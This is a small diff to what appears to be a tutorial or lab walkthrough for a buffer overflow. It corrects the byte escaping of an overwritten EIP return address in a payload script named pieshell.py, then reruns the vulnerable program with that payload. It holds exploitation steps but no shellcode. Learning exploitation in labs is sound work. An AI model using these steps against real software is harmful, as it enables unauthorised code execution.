@@ -109,7 +109,7 @@ x/2000xb($esp-450)
 //Step 10. Finialising our payload
 //open pieshell.py with nano:
 nano pieshell.py
-//update eip variable to be: '/xb6/xcb/xFF/xFF'
+//update eip variable to be: '\xb6\xcb\xFF\xFF'
 
 //Step 11 Execute vulnerable application one more time using updated pieshell.py with the command:
 run $(python2.7 ./pieshell.py)
